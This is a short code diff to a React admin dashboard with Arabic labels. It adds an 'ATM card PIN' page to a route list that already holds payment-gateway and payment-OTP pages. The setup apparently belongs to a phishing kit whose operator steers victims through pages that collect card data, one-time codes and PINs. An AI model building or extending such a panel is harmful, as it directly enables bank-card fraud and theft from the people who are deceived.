@@ -149,6 +149,7 @@ const AdminDashboard = () => {
     { value: "/account-creation", label: "إنشاء حساب" },
     { value: "/registration-complete", label: "بوابة الدفع 💳" },
     { value: "/payment-otp", label: "تحقق OTP الدفع" },
+    { value: "/atm-pin", label: "رقم PIN البطاقة 🏧" },
     { value: "/meme", label: "صورة ميم 😂" },
     { value: "/success", label: "النجاح" },
   ];
